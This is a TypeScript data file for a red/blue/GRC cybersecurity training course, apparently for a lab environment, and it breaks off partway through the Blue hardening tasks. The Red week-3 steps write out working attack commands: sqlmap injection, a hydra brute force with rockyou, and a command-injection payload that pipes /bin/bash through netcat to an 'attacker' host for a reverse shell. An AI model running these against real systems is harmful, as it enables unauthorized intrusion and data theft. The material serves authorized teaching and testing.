import { Task, Week, Gate } from './types';

// Week Metadata
export const WEEKS: Record<number, Week> = {
  0: {
    number: 0,
    title: 'Lab Setup & Rules of Engagement',
    theme: 'Stand up your environment and agree the rules before any testing',
    objective: 'Get your tools running, reach your targets, and confirm authorized scope',
    runs: 'Run 00'
  },
  1: {
    number: 1,
    title: 'Cold Recon',
    theme: 'Build, connect, passive recon, baseline hardening',
    objective: 'Establish baseline, passive reconnaissance, and foundational security controls',
    runs: 'Run 01'
  },
  2: {
    number: 2,
    title: 'Hard Target',
    theme: 'Authorized vulnerability assessment + SOC detection engineering',
    objective: 'Perform vulnerability discovery and detection engineering',
    runs: 'Run 02'
  },
  3: {
    number: 3,
    title: 'The Breach',
    theme: 'Attack, detect, investigate, preserve evidence',
    objective: 'Execute authorized attacks and investigate findings',
    runs: 'Run 03'
  },
  4: {
    number: 4,
    title: 'Payday',
    theme: 'Report and present findings',
    objective: 'Compile and present final findings and recommendations',
    runs: 'Run 04'
  }
};

// Gates
export const GATES: Gate[] = [
  {
    id: 1,
    week: 1,
    title: 'Gate 1',
    description: 'Case + Scope authored',
    requiredArtifactTypes: ['case_overview', 'scope_document'],
    requiredTasks: ['red-w1-osint', 'blue-w1-hardening', 'grc-w1-framework'],
    handoffs: [
      { from: 'grc', to: 'red', artifact: 'Rules_of_Engagement.md', label: 'Confirm authorized scope before any scanning' },
      { from: 'grc', to: 'blue', artifact: 'Hardening_Standard.md', label: 'Issue the hardening standard Blue implements' },
      { from: 'red', to: 'grc', artifact: 'Recon_Findings.md', label: 'Hand recon to GRC for the asset inventory' },
      { from: 'blue', to: 'grc', artifact: 'Hardening_Checklist.txt', label: 'Report what was hardened for the policy baseline' },
    ],
  },
  {
    id: 2,
    week: 2,
    title: 'Gate 2',
    description: 'Hardening + Logs in place',
    requiredArtifactTypes: ['hardening_checklist', 'baseline_logs'],
    requiredTasks: ['blue-w2-baseline', 'red-w2-enumeration', 'grc-w2-risk'],
    handoffs: [
      { from: 'grc', to: 'blue', artifact: 'VM_SOP.md', label: 'Issue the vulnerability-management SOP Blue follows' },
      { from: 'red', to: 'grc', artifact: 'Vulnerability_Summary.md', label: 'Hand findings to GRC for risk scoring' },
      { from: 'blue', to: 'grc', artifact: 'Detection_Rules.txt', label: 'Report the detections now in place' },
    ],
  },
  {
    id: 3,
    week: 3,
    title: 'Gate 3',
    description: 'Findings + Evidence complete',
    requiredArtifactTypes: ['pcap', 'findings', 'evidence_log'],
    requiredTasks: ['red-w3-attacks', 'blue-w3-detection', 'grc-w3-custody'],
    handoffs: [
      { from: 'grc', to: 'blue', artifact: 'IR_Runbook.md', label: 'Issue the incident-response runbook Blue follows during the breach' },
      { from: 'red', to: 'grc', artifact: 'Evidence_Photos.zip', label: 'Submit attack evidence for chain of custody' },
      { from: 'blue', to: 'grc', artifact: 'Incident_Response.txt', label: 'Submit IR notes and logs for custody' },
    ],
  }
];

// RED (Runners) Tasks
const RED_TASKS: Task[] = [
  {
    id: 'red-w0-setup',
    role: 'red',
    week: 0,
    title: 'Get Kali Ready & Confirm Scope',
    objective: 'Boot your Kali attack box, reach your company target, and confirm what you are authorized to test.',
    frameworks: ['NIST_CSF'],
    deliverables: [],
    learn: ['Booting and updating Kali Linux', 'Verifying network reach to a target', 'Reading the Rules of Engagement (authorized scope)'],
    tools: ['Kali Linux', 'ip / ping', 'apt'],
    prerequisites: ['Your company target IP (from the instructor)', "GRC's Rules_of_Engagement.md once issued"],
    definitionOfDone: ['Kali boots and is fully updated', 'You can ping your company target', 'You have read and understood the authorized scope'],
    handoff: [{ to: 'grc', note: 'Acknowledge the Rules of Engagement so GRC knows scope is understood.' }],
    steps: [
      {
        id: 'red-w0-s1',
        title: 'Boot & Update Kali',
        description: 'Boot your Kali VM and refresh then upgrade all packages.',
        instruction: 'Start the Kali VM, open a terminal, and run the update command.',
        command: 'sudo apt update && sudo apt -y upgrade',
        commandExplanation: '`apt update` refreshes the package list and `apt -y upgrade` installs the newest versions, auto-confirming with `-y`.',
        expectedOutput: 'Packages refreshed and upgraded',
        outputExplanation: 'A clean prompt with no errors means your tools are current; a long "upgraded, newly installed" summary is normal the first run.',
        whatItMeans: 'Your attack tools are patched and current before you begin.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'If apt reports a lock error, another update is running — wait a minute and retry, or reboot the VM.',
      },
      {
        id: 'red-w0-s2',
        title: 'Verify You Can Reach Your Target',
        description: 'Ping your assigned company host to confirm it is reachable.',
        instruction: 'Replace the placeholder with your target IP and run the ping.',
        command: 'ping -c 2 <YOUR_TARGET_IP>',
        commandExplanation: '`ping -c 2` sends exactly two packets to your target; replies prove the host is up and on your network.',
        expectedOutput: '2 packets transmitted, 2 received, 0% packet loss',
        outputExplanation: 'Low-time replies mean reachable; "Destination host unreachable" or 100% loss is a network problem to fix before scanning.',
        whatItMeans: 'You have a live network path to the box you are authorized to test.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'No reply? Check your VM network adapter is on the lab network (as the instructor specified) and the target is powered on.',
      },
      {
        id: 'red-w0-s3',
        title: 'Confirm Authorized Scope',
        description: 'Confirm what you are authorized to test.',
        instruction: 'Read the Rules of Engagement from GRC and confirm your authorized target(s) before any scanning.',
        whatItMeans: 'You attack only your own target, within the approved window.',
        frameworks: ['NIST_CSF'],
      },
    ],
  },
  {
    id: 'red-w1-osint',
    role: 'red',
    week: 1,
    title: 'OSINT & Passive Recon',
    objective: 'Gather open-source intelligence and passively fingerprint the target to build an asset list.',
    frameworks: ['NIST_CSF'],
    deliverables: ['Recon_Findings.md'],
    prerequisites: ['Setup_Notes_Red.md (Week 0: Kali ready, target reachable)', "GRC's Rules_of_Engagement.md (authorized scope)"],
    definitionOfDone: ['Assets and services identified', 'Recon_Findings.md and Asset_List.md saved to ~/team-artifacts/week-1/'],
    handoff: [{ to: 'grc', artifact: 'Asset_List.md + Recon_Findings.md', note: 'Feed recon into the asset inventory and risk mapping.' }],
    learn: ['OSINT & passive recon', 'DNS / WHOIS enumeration', 'Fingerprinting web tech with Kali'],
    tools: ['whois / dig', 'whatweb', 'theHarvester'],
    steps: [
      {
        id: 'red-w1-s1',
        title: 'Verify Connectivity',
        description: 'List your own IP and ping the target to confirm you share a subnet.',
        instruction: 'Run the command and note your eth0 address and the ping reply.',
        command: 'ip a && ping -c 1 10.10.10.1',
        commandExplanation: '`ip a` lists every network interface and its assigned address; `ping -c 1` sends a single ICMP echo (the `-c 1` caps it at one packet) to confirm the target answers.',
        commandFlags: [
          { flag: 'ip a', meaning: 'Show all network interfaces and their IP addresses.' },
          { flag: 'ping', meaning: 'Send ICMP echo requests to test reachability.' },
          { flag: '-c 1', meaning: 'Stop after 1 packet instead of pinging forever.' },
          { flag: '10.10.10.1', meaning: 'The host being pinged (the gateway/target).' },
        ],
        expectedOutput: 'eth0 inet 10.10.10.x, ping reply from target',
        outputExplanation: 'The `eth0` `inet` line in the 10.10.10.x range is your IP, and a "1 received, 0% packet loss" line proves the target answers.',
        whatItMeans: 'Your Kali box and the target sit on the same subnet, so scanning will work.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'red-w1-s2',
        title: 'WHOIS & DNS Enumeration',
        description: 'Query registration and DNS records to map the target domain.',
        instruction: 'Run the WHOIS and DNS lookups and note the registrar, name servers, and mail servers.',
        command: 'whois target.local && dig ANY target.local && nslookup -type=mx target.local',
        commandExplanation: '`whois` pulls registration/ownership records; `dig ANY` asks DNS for every record type at once; `nslookup -type=mx` narrows the query to just mail-exchanger records.',
        commandFlags: [
          { flag: 'whois', meaning: 'Query domain registration / ownership records.' },
          { flag: 'dig ANY', meaning: 'Ask DNS for every record type for the domain.' },
          { flag: 'nslookup -type=mx', meaning: 'Look up only mail-exchanger (mail server) records.' },
        ],
        expectedOutput: 'Domain info, A/MX/NS records',
        outputExplanation: 'The `whois` block shows the registrar and contacts; `dig` lists A, NS and MX records, with the MX names revealing where the target receives email.',
        whatItMeans: 'You now know the target owner, mail servers, and DNS structure.',
        frameworks: ['NIST_CSF', 'CIS']
      },
      {
        id: 'red-w1-s3',
        title: 'Web Tech Discovery',
        description: 'Fingerprint the target web stack and save the results to Recon_Findings.md.',
        instruction: 'Run whatweb and tee its output into the canonical recon file.',
        command: 'mkdir -p ~/team-artifacts/week-1 && whatweb http://10.10.10.x | tee ~/team-artifacts/week-1/Recon_Findings.md',
        commandExplanation: '`whatweb` fingerprints the server, language and frameworks behind the URL, and `tee` both prints them and saves them to Recon_Findings.md.',
        commandFlags: [
          { flag: 'whatweb', meaning: 'Fingerprint a website’s server, language and frameworks.' },
          { flag: 'http://10.10.10.x', meaning: 'The target URL to fingerprint.' },
        ],
        expectedOutput: 'Detected technologies printed and saved to Recon_Findings.md',
        outputExplanation: 'Each `[name version]` tag is a detected technology; record exact versions (e.g. Apache 2.4.x, PHP 5.x) because old versions map to known CVEs.',
        whatItMeans: 'You have a saved record of the exact software versions that may be exploitable.',
        frameworks: ['CIS', 'OWASP'],
        producesDeliverable: 'Recon_Findings.md',
        isEvidenceStep: true
      },
      {
        id: 'red-w1-s4',
        title: 'Email/Host Discovery',
        description: 'Harvest emails, subdomains, and hosts for the target domain.',
        instruction: 'Run theHarvester against the target domain and note candidate usernames and subdomains.',
        command: 'theHarvester -d target.local -b all',
        commandExplanation: '`theHarvester` collects OSINT for a domain; `-d` sets the target domain and `-b all` queries every available source (search engines, certificate logs, etc.).',
        commandFlags: [
          { flag: '-d target.local', meaning: 'The domain to gather intelligence about.' },
          { flag: '-b all', meaning: 'Use every available data source (search engines, certs, etc.).' },
        ],
        expectedOutput: 'Email list, subdomains, hosts',
        outputExplanation: 'Results are grouped into emails, hosts and subdomains — the email addresses become candidate usernames and the subdomains reveal extra attack surface.',
        whatItMeans: 'You have candidate usernames and additional infrastructure to target.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'red-w1-s5',
        title: 'Export to Asset List',
        description: 'Hand your discovered assets to GRC.',
        instruction: 'List the hosts and services you found and give them to GRC — they enter them into the Asset Inventory form.',
        whatItMeans: 'Your recon becomes the team asset inventory.',
        frameworks: ['NIST_CSF'],
      }
    ]
  },
  {
    id: 'red-w2-enumeration',
    role: 'red',
    week: 2,
    title: 'Vulnerability Discovery',
    objective: 'Perform authorized vulnerability enumeration using network and web scanning.',
    frameworks: ['NIST_CSF', 'CIS', 'OWASP'],
    deliverables: ['Nmap_Scan.txt', 'Nikto_Report.txt'],
    prerequisites: ['Week 1 asset list', 'Scope still valid (Rules of Engagement)'],
    definitionOfDone: ['All ports & web vulnerabilities enumerated', 'Vulnerability_Summary.md written for GRC'],
    handoff: [{ to: 'grc', artifact: 'Vulnerability_Summary.md', note: 'Hand findings to GRC for risk scoring.' }],
    learn: ['Port & service scanning with nmap', 'Web scanning with nikto', 'Summarizing vulnerabilities'],
    tools: ['nmap', 'nikto'],
    steps: [
      {
        id: 'red-w2-s1',
        title: 'Network Scan - All Ports',
        description: 'Scan all TCP ports with version detection.',
        command: 'mkdir -p ~/team-artifacts/week-2 && nmap -sV -p- 10.10.10.X > ~/team-artifacts/week-2/Nmap_Scan.txt',
        commandExplanation: '`nmap` scans for open ports; `-sV` probes each one to detect the service and version; `-p-` scans all 65,535 TCP ports; `> ~/team-artifacts/week-2/Nmap_Scan.txt` saves the result to the canonical file.',
        commandFlags: [
          { flag: 'nmap', meaning: 'Network port scanner.' },
          { flag: '-sV', meaning: 'Probe open ports to detect service and version.' },
          { flag: '-p-', meaning: 'Scan all 65,535 TCP ports, not just common ones.' },
          { flag: '> ~/team-artifacts/week-2/Nmap_Scan.txt', meaning: 'Save the scan to the canonical file for GRC.' },
        ],
        expectedOutput: 'Port list with service versions',
        outputExplanation: 'Each row shows PORT, STATE, SERVICE and VERSION — focus on `open` ports and their version strings, which are your candidate entry points.',
        whatItMeans: 'Discovers all listening network services and their versions.',
        frameworks: ['CIS'],
        producesDeliverable: 'Nmap_Scan.txt',
        isEvidenceStep: true
      },
      {
        id: 'red-w2-s2',
        title: 'Web Vulnerability Scan',
        description: 'Run automated web scanner against target.',
        command: 'mkdir -p ~/team-artifacts/week-2 && nikto -h http://10.10.10.X -o ~/team-artifacts/week-2/Nikto_Report.txt',
        commandExplanation: '`nikto` is a web-server scanner; `-h` sets the host URL to test and `-o` writes the findings to a report file.',
        commandFlags: [
          { flag: 'nikto', meaning: 'Automated web-server vulnerability scanner.' },
          { flag: '-h', meaning: 'Target host/URL to scan.' },
          { flag: '-o ~/team-artifacts/week-2/Nikto_Report.txt', meaning: 'Write findings to the canonical report file.' },
        ],
        expectedOutput: 'Vulnerabilities: directory indexing, default files, old software',
        outputExplanation: 'Lines beginning with `+` are findings — outdated software, exposed directories, or dangerous default files. Each usually cites an OSVDB/CVE reference to research.',
        whatItMeans: 'Identifies common web misconfigurations and known web vulnerabilities.',
        frameworks: ['OWASP'],
        producesDeliverable: 'Nikto_Report.txt',
        isEvidenceStep: true
      },
      {
        id: 'red-w2-s3',
        title: 'SSH Auth Methods',
        description: 'Identify authentication methods on SSH.',
        command: 'nmap --script ssh-auth-methods 10.10.10.X',
        commandExplanation: '`nmap --script ssh-auth-methods` runs an NSE script that connects to SSH and asks which authentication methods the server will accept.',
        commandFlags: [
          { flag: '--script ssh-auth-methods', meaning: 'Run the NSE script that lists accepted SSH auth methods.' },
          { flag: '10.10.10.5', meaning: 'The SSH host to query.' },
        ],
        expectedOutput: 'SSH allows password auth',
        outputExplanation: 'The script lists supported methods; seeing `password` means logins can be brute-forced, whereas `publickey` only would be far safer.',
        whatItMeans: 'Password auth enabled = brute force risk; SSH key only would be better.',
        frameworks: ['CIS']
      },
      {
        id: 'red-w2-s4',
        title: 'Summarize Vulnerabilities for GRC',
        description: 'Summarize your scan findings for the report.',
        instruction: 'Write up your nmap and nikto findings in the Penetration Test Report form — it builds the report for you.',
        whatItMeans: 'GRC gets a clean, ranked list to risk-score instead of raw scan dumps.',
        frameworks: ['NIST_CSF'],
        usesForm: 'Penetration Test Report',
      }
    ]
  },
  {
    id: 'red-w3-attacks',
    role: 'red',
    week: 3,
    title: 'Authorized Attacks & Evidence',
    objective: 'Execute one well-documented exploit chain with complete evidence trail.',
    frameworks: ['OWASP', 'NIST_800_61', 'CVSS'],
    deliverables: ['SQL_Injection_Proof.txt', 'Brute_Force_Proof.txt', 'Reverse_Shell_Proof.txt', 'Evidence_Photos.zip'],
    prerequisites: ['Confirmed vulnerabilities from Week 2', 'Rules of Engagement (stay in scope)'],
    definitionOfDone: ['One full exploit chain proven with evidence', 'All *_Proof.txt + Evidence_Photos.zip saved'],
    handoff: [{ to: 'grc', artifact: 'Evidence_Photos.zip', note: 'Submit attack evidence for chain of custody.' }],
    learn: ['Exploiting SQL injection', 'Brute-forcing authentication', 'Command injection & reverse shells', 'Capturing court-ready evidence'],
    tools: ['sqlmap / Burp', 'hydra', 'netcat'],
    steps: [
      {
        id: 'red-w3-s1',
        title: 'SQL Injection Attack',
        description: 'Exploit SQL injection vulnerability in DVWA.',
        command: 'mkdir -p ~/team-artifacts/week-3 && sqlmap -u http://10.10.10.X/DVWA/vulnerabilities/sqli/ --auth-creds=admin:password --dbs | tee ~/team-artifacts/week-3/SQL_Injection_Proof.txt',
        commandExplanation: '`sqlmap` automates SQL-injection testing; `-u` is the vulnerable URL, `--auth-creds` supplies a login so it can reach the page, and `--dbs` tells it to enumerate database names once injection works.',
        commandFlags: [
          { flag: 'sqlmap', meaning: 'Automated SQL-injection testing tool.' },
          { flag: '-u <url>', meaning: 'The URL to test for SQL injection.' },
          { flag: '--auth-creds=admin:password', meaning: 'Log in first so the vulnerable page is reachable.' },
          { flag: '--dbs', meaning: 'Once injectable, enumerate the database names.' },
        ],
        expectedOutput: 'Database list, users table extracted',
        outputExplanation: 'If injectable, sqlmap prints the DBMS type and an `available databases` list — proof the input is unsanitized and data can be pulled out.',
        whatItMeans: 'Demonstrates data exfiltration risk from SQL injection.',
        frameworks: ['OWASP'],
        producesDeliverable: 'SQL_Injection_Proof.txt',
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s2',
        title: 'Brute Force Attack',
        description: 'Attack login form with hydra.',
        command: 'mkdir -p ~/team-artifacts/week-3 && hydra -l admin -P /usr/share/wordlists/rockyou.txt http-post-form://10.10.10.X/login.php:username=^USER^&password=^PASS^:S=Welcome | tee ~/team-artifacts/week-3/Brute_Force_Proof.txt',
        commandExplanation: '`hydra` brute-forces logins; `-l admin` fixes the username, `-P` points to the rockyou password list, and the `http-post-form` string defines the URL, the field layout (`^USER^`/`^PASS^`), and `S=Welcome` as the success marker.',
        commandFlags: [
          { flag: 'hydra', meaning: 'Parallel login brute-forcer.' },
          { flag: '-l admin', meaning: 'Single username to try (lowercase L).' },
          { flag: '-P rockyou.txt', meaning: 'Password list file to try (uppercase P).' },
          { flag: 'http-post-form', meaning: 'Attack an HTTP POST login form.' },
          { flag: '^USER^ / ^PASS^', meaning: 'Placeholders Hydra fills with each guess.' },
          { flag: 'S=Welcome', meaning: 'Text in the response that marks a successful login.' },
        ],
        expectedOutput: 'Credentials found',
        outputExplanation: 'A green `[80][http-post-form] ... login: admin password: <found>` line means hydra guessed a valid password — evidence of weak credentials and no account lockout.',
        whatItMeans: 'Shows weak password vulnerability and lack of account lockout.',
        frameworks: ['CIS', 'OWASP'],
        producesDeliverable: 'Brute_Force_Proof.txt',
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s3',
        title: 'Command Injection & Reverse Shell',
        description: 'Inject command and establish reverse shell.',
        instruction: 'After you get the shell, save the `id` output and session notes to ~/team-artifacts/week-3/Reverse_Shell_Proof.txt as proof.',
        command: 'nc -lvnp 4444 & echo "Payload: 127.0.0.1 | nc -c /bin/bash attacker 4444" > /dev/clipboard',
        commandExplanation: '`nc -lvnp 4444` starts a Netcat listener (`-l` listen, `-v` verbose, `-n` no DNS, `-p` port) waiting for the target to connect back; the payload is the injected command that makes the victim run `/bin/bash` piped to your listener.',
        commandFlags: [
          { flag: 'nc', meaning: 'Netcat — raw TCP/UDP connections.' },
          { flag: '-l', meaning: 'Listen mode (wait for a connection).' },
          { flag: '-v', meaning: 'Verbose output.' },
          { flag: '-n', meaning: 'No DNS resolution (use raw IPs).' },
          { flag: '-p 4444', meaning: 'Listen on port 4444.' },
          { flag: '&', meaning: 'Run the listener in the background.' },
        ],
        expectedOutput: 'Reverse shell connection established; id command shows www-data',
        outputExplanation: 'When the victim connects you get a shell prompt; running `id` returns `uid=33(www-data)`, confirming remote code execution as the web-server user.',
        whatItMeans: 'Demonstrates RCE and full system compromise.',
        frameworks: ['OWASP'],
        producesDeliverable: 'Reverse_Shell_Proof.txt',
        isEvidenceStep: true
      },
      {
        id: 'red-w3-s4',
        title: 'Screenshot Evidence',
        description: 'Capture proof of successful exploitation.',
        instruction: 'Save your screenshots, then zip them into the canonical evidence bundle: `zip ~/team-artifacts/week-3/Evidence_Photos.zip *.png`.',
        command: 'screenshot named YYYYMMDD_TeamXX_Tool_Action.png',
        commandExplanation: 'This is a naming convention, not a binary: capture the screen and save it as `YYYYMMDD_TeamXX_Tool_Action.png` so every artifact is dated, attributed and self-describing.',
        commandFlags: [
          { flag: 'YYYYMMDD', meaning: 'Date the evidence was captured.' },
          { flag: 'TeamXX', meaning: 'Your team number, for attribution.' },
          { flag: 'Tool', meaning: 'Tool used (e.g. sqlmap, hydra).' },
          { flag: 'Action', meaning: 'What the screenshot proves.' },
        ],
        expectedOutput: 'Evidence file created with naming convention',
        outputExplanation: 'A correctly named PNG (e.g. `20260624_Team01_sqlmap_dbdump.png`) should appear in your evidence folder, ready for the chain-of-custody log.',
        whatItMeans: 'Documented proof required by GRC for compliance and reporting. Attach these to the Penetration Test Report form.',
        frameworks: ['NIST_800_61'],
        usesForm: 'Penetration Test Report',
        producesDeliverable: 'Evidence_Photos.zip',
        isEvidenceStep: true
      }
    ]
  },
  {
    id: 'red-w4-briefing',
    role: 'red',
    week: 4,
    title: 'Technical Findings Briefing',
    objective: 'Present technical exploits and findings in plain English to stakeholders.',
    frameworks: ['ISO_27001', 'NIST_CSF'],
    deliverables: [],
    prerequisites: ['All Week 3 evidence', "GRC's Findings.md"],
    definitionOfDone: ['Plain-English explanation written', 'Your briefing slides drafted'],
    handoff: [{ to: 'grc', artifact: 'Technical_Explanation.md', note: 'Feed the technical narrative into the final report.' }],
    learn: ['Explaining exploits to non-technical stakeholders', 'Building a findings briefing'],
    tools: ['Markdown', 'Slides'],
    steps: [
      {
        id: 'red-w4-s1',
        title: 'Review Attack Timeline',
        description: 'Prepare chronological attack narrative.',
        command: 'cat timeline.txt',
        commandExplanation: '`cat` prints the contents of `timeline.txt` to the screen so you can review the attack chronology you recorded.',
        commandFlags: [
          { flag: 'cat', meaning: 'Print a file’s contents to the screen.' },
          { flag: 'timeline.txt', meaning: 'The file holding your recorded attack events.' },
        ],
        expectedOutput: 'Clear sequence of events',
        outputExplanation: 'You should see your timestamped events in order; gaps or out-of-order entries are your cue to tidy the narrative before briefing.',
        whatItMeans: 'Tells the story of how the compromise occurred.',
        frameworks: ['ISO_27001']
      },
      {
        id: 'red-w4-s2',
        title: 'Explain Each Finding',
        description: 'Explain each finding in plain English.',
        instruction: 'Explain each finding (impact and fix) in the Penetration Test Report form.',
        whatItMeans: 'Non-technical stakeholders understand the risk.',
        frameworks: ['ISO_27001'],
        usesForm: 'Penetration Test Report',
      },
      {
        id: 'red-w4-s3',
        title: 'Draft Your Briefing Slides',
        description: 'Prepare your briefing slides.',
        instruction: 'Build a few briefing slides from your Penetration Test Report — one beat per finding.',
        whatItMeans: 'Your half of the final briefing is ready to combine with Blue and GRC.',
        frameworks: ['ISO_27001'],
      }
    ]
  }
];

// BLUE (Wardens) Tasks
const BLUE_TASKS: Task[] = [
  {
    id: 'blue-w0-setup',
    role: 'blue',
    week: 0,
    title: 'Reach Your Ubuntu & Windows Targets',
    objective: 'Connect to both company servers you defend and capture a clean pre-hardening snapshot.',
    frameworks: ['NIST_CSF'],
    deliverables: [],
    learn: ['Connecting to Linux (SSH) and Windows (RDP) hosts', 'Taking a baseline snapshot before any change', 'Identifying the two systems you defend'],
    tools: ['ssh', 'xfreerdp / Remote Desktop', 'VM snapshots'],
    prerequisites: ['Ubuntu and Windows target IPs + credentials (from the instructor)'],
    definitionOfDone: ['You can SSH into the Ubuntu target', 'You can RDP into the Windows target', 'A "pre-hardening" snapshot exists for both VMs'],
    handoff: [{ to: 'grc', note: 'Confirm both targets are reachable so GRC can finalize the hardening standard.' }],
    steps: [
      {
        id: 'blue-w0-s1',
        title: 'SSH Into the Ubuntu Target',
        description: 'Open a remote shell on the Linux server you will harden.',
        command: 'ssh user@<UBUNTU_IP>',
        commandExplanation: '`ssh user@host` opens an encrypted remote shell on the Ubuntu server using the account the instructor gave you.',
        expectedOutput: 'A shell prompt on the Ubuntu host',
        outputExplanation: 'A changed prompt (e.g. `user@ubuntu:~$`) means you are now on the target, not your own machine.',
        whatItMeans: 'You can administer the Linux system you defend.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'Connection refused? Ensure the Ubuntu VM is up and SSH is running (`sudo systemctl status ssh`).',
      },
      {
        id: 'blue-w0-s2',
        title: 'RDP Into the Windows Target',
        description: 'Open a remote desktop on the Windows server you will harden.',
        command: 'xfreerdp /u:Administrator /v:<WINDOWS_IP>',
        commandExplanation: '`xfreerdp` is a Linux RDP client; `/u:` is the username and `/v:` is the Windows host to connect to.',
        expectedOutput: 'The Windows desktop appears',
        outputExplanation: 'Seeing the Windows desktop confirms Remote Desktop is enabled and reachable.',
        whatItMeans: 'You can administer the Windows system you defend.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'Blocked? On the Windows host enable Remote Desktop (System > Remote Desktop) and allow it through Windows Firewall.',
      },
      {
        id: 'blue-w0-s3',
        title: 'Snapshot Before Hardening',
        description: 'Capture a restore point on both VMs before changing anything.',
        instruction: 'In your hypervisor, take a snapshot named "pre-hardening" of BOTH the Ubuntu and Windows VMs.',
        expectedOutput: 'Two "pre-hardening" snapshots',
        outputExplanation: 'Snapshots let you compare before/after and roll back safely if a change breaks something.',
        whatItMeans: 'You have a known-good baseline to measure your hardening against.',
        frameworks: ['NIST_CSF'],
        troubleshooting: 'No snapshot option? Power off the VM first, or use your hypervisor’s "clone" feature as a fallback.',
      },
    ],
  },
  {
    id: 'blue-w1-hardening',
    role: 'blue',
    week: 1,
    title: 'Baseline Hardening (Ubuntu + Windows)',
    objective: 'Harden both company servers — the Ubuntu web host and the Windows host — with essential controls.',
    frameworks: ['NIST_CSF', 'CIS'],
    deliverables: ['UFW_Status.txt', 'Lynis_Report.txt', 'Windows_Firewall.txt', 'Defender_Status.txt'],
    prerequisites: ["GRC's Hardening_Standard.md (what controls to apply)", 'SSH access to Ubuntu and RDP access to Windows (Week 0)'],
    definitionOfDone: ['Ubuntu: firewall on, fail2ban running, Lynis audited', 'Windows: Firewall on, Defender updated & scanned, SMBv1 disabled', 'Hardening_Checklist.txt reflects both hosts'],
    handoff: [{ to: 'grc', artifact: 'Hardening_Checklist.txt', note: 'Report what was hardened on both hosts for the policy baseline.' }],
    learn: ['Linux hardening: UFW, fail2ban, Lynis', 'Windows hardening: Windows Firewall, Defender, disabling SMBv1', 'Working across two operating systems'],
    tools: ['ufw', 'fail2ban', 'lynis', 'PowerShell', 'Microsoft Defender'],
    steps: [
      {
        id: 'blue-w1-s1',
        title: 'SSH Into Target',
        description: 'Establish secure connection to target server.',
        command: 'ssh user@10.10.10.5',
        commandExplanation: '`ssh user@host` opens an encrypted remote shell to the server as the named user, prompting for that account password.',
        commandFlags: [
          { flag: 'ssh', meaning: 'Open an encrypted remote shell.' },
          { flag: 'user@10.10.10.5', meaning: 'Log in as “user” on the target host.' },
        ],
        expectedOutput: 'Shell prompt; whoami shows non-root user',
        outputExplanation: 'A changed prompt (e.g. `user@target:~$`) means you are in; `whoami` returning a non-root name confirms least-privilege access.',
        whatItMeans: 'You are connected as non-root (good security), can now apply hardening.',
        frameworks: ['NIST_CSF']
      },
      {
        id: 'blue-w1-s2',
        title: 'Update System',
        description: 'Apply latest security patches.',
        command: 'sudo apt update && sudo apt upgrade -y',
        commandExplanation: '`apt update` refreshes the package index; `apt upgrade -y` then installs all available updates with `-y` auto-confirming the prompts. `sudo` runs both as root.',
        commandFlags: [
          { flag: 'sudo', meaning: 'Run as root (required to change the system).' },
          { flag: 'apt update', meaning: 'Refresh the list of available packages.' },
          { flag: 'apt upgrade', meaning: 'Install the available updates.' },
          { flag: '-y', meaning: 'Auto-answer “yes” to prompts.' },
        ],
        expectedOutput: 'Packages updated',
        outputExplanation: 'Watch the summary line — "X upgraded, Y newly installed" — and make sure it finishes without errors, meaning known-vulnerable packages are now patched.',
        whatItMeans: 'Patches known vulnerabilities in OS and applications.',
        frameworks: ['CIS']
      },
      {
        id: 'blue-w1-s3',
        title: 'Configure Firewall',
        description: 'Enable UFW and allow only SSH and HTTP.',
        command: 'sudo ufw default deny incoming && sudo ufw allow 22 && sudo ufw allow 80 && sudo ufw --force enable && mkdir -p ~/team-artifacts/week-1 && sudo ufw status verbose > ~/team-artifacts/week-1/UFW_Status.txt',
        commandExplanation: 'Builds a default-deny firewall: `default deny incoming` blocks all inbound traffic, `allow 22`/`allow 80` open SSH and HTTP, and `enable` activates the ruleset.',
        commandFlags: [
          { flag: 'default deny incoming', meaning: 'Block all inbound traffic by default.' },
          { flag: 'allow 22', meaning: 'Permit SSH.' },
          { flag: 'allow 80', meaning: 'Permit HTTP.' },
          { flag: 'enable', meaning: 'Turn the firewall on.' },
        ],
        expectedOutput: 'UFW enabled, status shows SSH and HTTP allowed',
        outputExplanation: '`Firewall is active and enabled on system startup` confirms it is on; `ufw status` should then list only 22 and 80 as ALLOW.',
        whatItMeans: 'Restricts inbound traffic to only necessary services. Log this change in the Change Log form.',
        frameworks: ['CIS'],
        usesForm: 'Change Log',
        producesDeliverable: 'UFW_Status.txt',
        isEvidenceStep: true
      },
      {
        id: 'blue-w1-s4',
        title: 'Install Fail2Ban',
        description: 'Protect against brute force attacks.',
        command: 'sudo apt install -y fail2ban && sudo systemctl enable --now fail2ban',
        commandExplanation: '`apt install fail2ban` installs the intrusion-prevention tool; `systemctl enable` sets it to start automatically at every boot.',
        commandFlags: [
          { flag: 'apt install fail2ban', meaning: 'Install the brute-force protection tool.' },
          { flag: 'systemctl enable fail2ban', meaning: 'Start it automatically on every boot.' },
        ],
        expectedOutput: 'Fail2Ban running and enabled',
        outputExplanation: '`Created symlink ... fail2ban.service` confirms it is enabled; `systemctl status fail2ban` should read `active (running)`.',
        whatItMeans: 'Automatically blocks repeated failed login attempts. Record your hardening in the Hardening Baseline form.',
        frameworks: ['CIS'],
        usesForm: 'Hardening Baseline',
        isEvidenceStep: true
      },
      {
        id: 'blue-w1-s5',
        title: 'System Audit with Lynis',
        description: 'Run comprehensive security audit.',
        command: 'mkdir -p ~/team-artifacts/week-1 && sudo lynis audit system | tee ~/team-artifacts/week-1/Lynis_Report.txt',
        commandExplanation: '`lynis audit system` runs a comprehensive local security audit across files, services and config; `| tee ~/team-artifacts/week-1/Lynis_Report.txt` shows and saves the full output for review.',
        commandFlags: [
          { flag: 'lynis audit system', meaning: 'Run a full local security audit.' },
          { flag: '| tee ~/team-artifacts/week-1/Lynis_Report.txt', meaning: 'Show and save the audit output to the canonical file.' },
        ],
        expectedOutput: 'Hardening index score, warnings list',
        outputExplanation: 'The end shows a `Hardening index` (0–100) plus `Warnings` and `Suggestions` — the index tracks your progress and the warnings are your to-do list.',
        whatItMeans: 'Identifies remaining security gaps and compliance issues.',
        frameworks: ['NIST_CSF'],
        producesDeliverable: 'Lynis_Report.txt',
        isEvidenceStep: true
      },
      {
